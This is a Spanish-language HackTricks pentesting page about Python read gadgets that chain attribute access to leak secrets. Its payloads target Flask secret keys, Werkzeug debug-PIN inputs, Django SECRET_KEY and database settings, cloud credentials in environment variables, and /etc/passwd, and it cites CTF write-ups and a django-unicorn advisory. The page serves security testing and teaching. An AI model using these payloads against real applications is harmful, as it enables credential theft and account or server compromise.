# Gadgets de lectura interna de Python

{{#include ../../banners/hacktricks-training.md}}


## Información básica

Diferentes vulnerabilidades, como [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), podrían permitirte **leer datos internos de Python, pero no ejecutar código**. Por lo tanto, un pentester tendrá que aprovechar al máximo estos permisos de lectura para **obtener privilegios sensibles y escalar la vulnerabilidad**.

### Flask - Leer la clave secreta

La página principal de una aplicación Flask probablemente tendrá el objeto global **`app`**, donde se **configura este secreto**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
En este caso, es posible acceder a este objeto usando cualquier gadget para **acceder a objetos globales** de la [**página Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

En el caso de que **la vulnerabilidad se encuentre en un archivo python diferente**, necesitas un gadget para recorrer archivos hasta llegar al principal, para **acceder al objeto global `app.secret_key`** y poder [**escalar privilegios** conociendo esta clave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload como este [del siguiente writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa este payload para **leer `app.secret_key`**. Si el bug original también te proporciona una primitiva de escritura (por ejemplo, class pollution), se puede usar el mismo camino para reemplazarla y firmar cookies de Flask con más privilegios.

### Werkzeug - machine_id y node uuid

[**Usando estos payloads de este writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) podrás acceder al **machine_id** y al nodo **uuid**, que son los **datos privados** que necesitas para [**generar el pin de Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) y acceder a la consola de Python en `/console` si el **debug mode está habilitado**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Ten en cuenta que puedes obtener la **ruta local del servidor al archivo `app.py`** generando algún **error** en la página web que te **dará la ruta**.

Si la vulnerabilidad se encuentra en un archivo Python diferente, revisa el truco anterior de Flask para acceder a los objetos del archivo Python principal.

### Django - SECRET_KEY y módulo de settings

El objeto de settings de Django se almacena en caché en `sys.modules` una vez que la aplicación se inicia. Con solo primitivas de lectura puedes hacer leak de la **`SECRET_KEY`**, las claves de fallback, las credenciales de la base de datos o las sales de firma:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Si el gadget vulnerable está en otro módulo, recorre primero globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` son igual de valiosos que el `SECRET_KEY` actual: siguen validando valores firmados antiguos durante la rotación.<sup>[[1]](#references)</sup> Además, filtra `SESSION_ENGINE` y `SESSION_SERIALIZER` para determinar rápidamente si el impacto se limita a la falsificación de cookies o si es algo más grave. Para obtener detalles sobre el impacto web, consulta la [**página de pentesting de Django**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - leer código fuente y archivos

Los módulos de Python cargados suelen conservar un `__loader__`. Los loaders respaldados por archivos suelen exponer `get_source()` y `get_data()`, que son primitivas perfectas de **solo lectura** cuando ya puedes acceder a un objeto de módulo, pero no a `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Esto resulta muy útil para volcar **módulos de configuración, blueprints, archivos auxiliares o rutas ocultas** y recuperar API keys, DSNs, rutas de flags o puntos de entrada adicionales para gadgets.

Si solo tienes enumeración de subclases, busca el loader por nombre en lugar de codificar un índice:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals del frame de generator / coroutine

Si puedes crear o alcanzar un objeto generator/coroutine, su frame puede hacer leak de los globals **sin necesitar ningún gadget `__globals__` de una función**. Esto resulta útil contra filtros que solo bloquean nombres dunder y olvidan atributos del frame como `gi_frame`, `ag_frame`, `cr_frame` o `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Una vez que tengas los globals del frame, continúa exactamente como en los demás gadgets (`sys.modules`, objetos de configuración, `os.environ`, etc.). Los escapes de sandbox recientes siguen redescubriendo esto porque `gi_frame` y `f_globals` no son atributos dunder y a menudo sobreviven a las deny-lists ingenuas.

### Variables de entorno / credenciales cloud mediante módulos cargados

Muchos jails todavía importan `os` o `sys` en algún punto. Puedes abusar de cualquier función accesible `__init__.__globals__` para pivotar al módulo `os` ya importado y volcar las **variables de entorno** que contienen API tokens, cloud keys o flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si el índice de la subclase está filtrado, usa loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Las variables de entorno son frecuentemente los únicos secretos necesarios para pasar de read a compromiso total (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) permitía **class pollution** mediante component requests especialmente diseñadas. Establecer un property path como `__init__.__globals__` permitía a un atacante acceder a los globals del módulo del componente y a cualquier módulo importado (por ejemplo, `settings`, `os`, `sys`). Desde ahí se podía hacer leak de `SECRET_KEY`, `DATABASES` o credenciales de servicios sin ejecución de código. La exploit chain se basa exclusivamente en lectura y utiliza los mismos patrones de dunder-gadgets indicados anteriormente.<sup>[[5]](#references)</sup>

### Gadget collections for chaining

Los CTF recientes y la investigación sobre pyjail muestran read chains fiables creados únicamente con attribute access y subclass enumeration. Listas mantenidas por la comunidad, como [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), catalogan cientos de gadgets mínimos que se pueden combinar para recorrer desde objetos hasta `__globals__`, `sys.modules` y, finalmente, datos sensibles.<sup>[[2]](#references)</sup> Es preferible usar búsquedas basadas en **attributes/names** en lugar de índices de subclasses sin procesar, porque la posición de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. cambia entre versiones de Python y con bibliotecas adicionales importadas.

## Referencias

- [1] [Documentación de Django sobre cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki de Python sandbox gadgets](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup de FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Vulnerabilidad de Class Pollution de Django-Unicorn, que permite RCE, XSS, DoS y Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
